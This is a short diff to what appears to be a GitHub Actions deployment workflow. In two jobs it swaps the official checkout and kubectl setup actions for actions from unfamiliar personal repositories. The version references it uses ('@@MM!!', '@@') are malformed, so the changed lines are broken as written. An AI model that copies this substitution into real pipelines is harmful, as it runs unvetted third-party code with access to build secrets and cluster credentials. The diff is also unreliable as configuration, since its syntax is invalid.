@@ -11,10 +11,10 @@ jobs:
 
     steps:
     - name: Checkout Repository
-      uses: actions/checkout@v2
+      uses: seonm096/sh6871@@MM!!
 
     - name: Set up Kubectl
-      uses: azure/setup-kubectl@v1
+      uses: seon9604/sh6871@@
       with:
         version: 'latest'
 
@@ -32,7 +32,7 @@ jobs:
 
     steps:
     - name: Checkout Repository
-      uses: actions/checkout@v2
+      uses: seonm096/sh6871@@MM!!
 
     - name: Set up Kubectl
       uses: seon9604/sh6871@@
